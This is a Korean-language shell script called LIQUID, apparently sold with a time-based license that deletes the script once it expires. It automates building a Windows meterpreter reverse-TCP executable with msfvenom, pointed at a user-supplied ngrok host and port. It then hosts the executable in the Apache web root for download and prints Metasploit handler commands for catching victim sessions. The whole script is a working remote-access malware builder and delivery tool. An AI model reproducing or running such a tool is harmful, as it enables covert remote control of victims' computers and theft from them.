
#!/bin/sh

NgrokIP=
NgrokPort=
Name=
IP=

sudo chmod +x LIQUID.sh;

sudo apt-get install rdate;

clear;

if [ -d /usr/share/doc/rdate ] ; then
	time=202010051000
	sudo rdate -s time.bora.net;
	timenow=`date +%Y%m%d%H%M`
	
	if [ ${timenow} -le ${time} ] ; then
		echo "\nLIQUID(리퀴드, 제작자 : 앙성현#6790) \n\n"
		echo "사용법을 잘모르시면 사용설명서를 읽어주세요 \n\n"
		echo -n "Ngrok IP를 입력 해주세요(Ngrok 사용법 참고) : "
		read NgrokIP
		echo -n "\nNgrok Port를 입력 해주세요(Ngrok 사용법 참고) : "
		read NgrokPort
		echo -n "\n바이러스의 이름을 입력 해주세요 : "
		read Name
		echo -n "\n이 컴퓨터의 IP를 입력 해주세요 : "
		read IP
		echo "\n\n필요한 프로그램 실행 중........"
		sudo service postgresql start;
		echo "\n\n바이러스를 제작 중........"
		sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${NgrokIP} LPORT=${NgrokPort} -f exe -o /home/kali/바탕화면/LIQUID/virus/${Name}.exe;
		echo "\n\n~/바탕화면/LIQUID/virus/에 ${Name}.exe를 만들었습니다"
		echo "\n\n바이러스를 ${IP}/${Name}.exe에 올리는 중........"
		sudo service apache2 start;
		sudo cp /home/kali/바탕화면/LIQUID/virus/${Name}.exe /var/www/html/;
		echo "\n\n~/바탕화면/LIQUID/virus에 ${Name}.exe를 삭제합니다, /var/www/html에 복사했습니다."
		sudo rm ${Name}.exe;
		echo "\n\n뒤에 나올 글들을 차례대로 입력 해주시길 바랍니다."
		echo "use exploit/multi/handler \n\nset payload windows/meterpreter/reverse_tcp \n\nset lhost ${IP} \n\nset lport ${NgrokPort}\n\nset exitonsession false \n\n공격 실행은 run\n\n연결이 됬나 확인이 하고 싶으시면 session \n\n확인이 되셨으면 선택을 하고 싶으시면 session -i @   @는 번호 입니다(예 > session0 -i 1 이면 1번 선택) \n\n"
		msfconsole;
	
	else
		sudo rm /home/kali/LIQUID/LIQUID/LIQUID.sh;
		echo "만료됨 앙성형#6790에게 연락해서 다시 구매해주세요"	
	fi

else 
	sudo rm /home/kali/LIQUID/LIQUID/LIQUID.sh;
fi
